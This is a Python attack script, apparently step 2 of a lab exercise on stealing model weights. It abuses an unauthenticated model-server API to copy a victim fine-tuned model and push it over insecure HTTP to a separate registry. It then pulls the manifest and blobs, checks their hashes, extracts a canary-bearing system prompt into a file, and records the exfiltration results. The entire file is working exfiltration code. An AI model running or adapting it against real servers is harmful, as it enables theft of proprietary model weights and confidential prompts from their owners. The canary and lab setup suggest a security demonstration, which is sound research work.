"""Step 2: ask the open API to push the fine-tune to the lab registry, then hash the blobs.

    docker compose run --rm workbench python attack-weight-theft/scripts/s02_exfiltrate.py
"""
import json

import labkit

import theftkit

labkit.banner()

copy_status, copy_body = theftkit.copy_model(theftkit.MODEL, theftkit.PUSH_NAME)
print(f"[ok] POST /api/copy HTTP {copy_status} -> {theftkit.PUSH_NAME}")

seconds, last, err = theftkit.push_model(theftkit.PUSH_NAME)
if err:
    print(f"[!!] push failed after {seconds:.1f}s: {err}")
    raise SystemExit(1)
print(f"[ok] POST /api/push insecure HTTP success in {seconds:.1f}s (last status {last!r})")

status, raw, man = theftkit.manifest(theftkit.STOLEN_REPO, theftkit.STOLEN_TAG)
print(f"[ok] GET /v2/{theftkit.STOLEN_REPO}/manifests/{theftkit.STOLEN_TAG} HTTP {status}")

saved = {}
weight_equals = None
for layer in man["layers"]:
    kind = layer["mediaType"].rsplit(".", 1)[-1]
    digest = layer["digest"]
    if layer["size"] > 1_000_000:
        hexdigest, size, took = theftkit.blob_sha256(theftkit.STOLEN_REPO, digest)
        match = "sha256:" + hexdigest == digest
        print(f"[ok] {kind} {digest} bytes {size} sha256 match {match} hashed in {took:.2f}s")
        saved[kind] = {"digest": digest, "size": size, "match": match, "seconds": round(took, 3)}
        if kind == "model":
            weight_equals = digest
    else:
        hexdigest, size, took = theftkit.blob_sha256(theftkit.STOLEN_REPO, digest)
        match = "sha256:" + hexdigest == digest
        # Re-read small blobs so we can search them. They are a few kilobytes.
        _, body = theftkit.get(f"{theftkit.REGISTRY}/v2/{theftkit.STOLEN_REPO}/blobs/{digest}", timeout=30)
        text = body.decode("utf-8", "replace")
        has = theftkit.CANARY in text
        print(f"[ok] {kind} {digest} bytes {size} sha256 match {match} canary {has}")
        saved.setdefault(kind, [])
        if isinstance(saved[kind], dict):
            saved[kind] = [saved[kind]]
        saved[kind].append({
            "digest": digest, "size": size, "match": match, "canary": has,
            "text": text if has or size < 200 else "",
        })
        if has and kind == "system":
            labkit.out("stolen-system.txt").write_text(text)

_, models = theftkit.tags()
victim = theftkit.digest_of(models.get("models", []), theftkit.MODEL)
pushed = theftkit.digest_of(models.get("models", []), theftkit.PUSH_NAME)
print(f"[ok] victim model digest equals pushed name: {bool(victim and victim == pushed)}")
print(f"victim digest {victim}")

total = sum(layer["size"] for layer in man["layers"])
print(f"[ok] bytes in the stolen manifest: {total}")

labkit.out("exfil.json").write_text(json.dumps({
    "push_s": round(seconds, 3),
    "victim_digest": victim,
    "pushed_digest": pushed,
    "digests_equal": victim == pushed and bool(victim),
    "bytes": total,
    "weight_digest": weight_equals,
    "layers": saved,
}, indent=2))
print("[ok] wrote exfil.json")
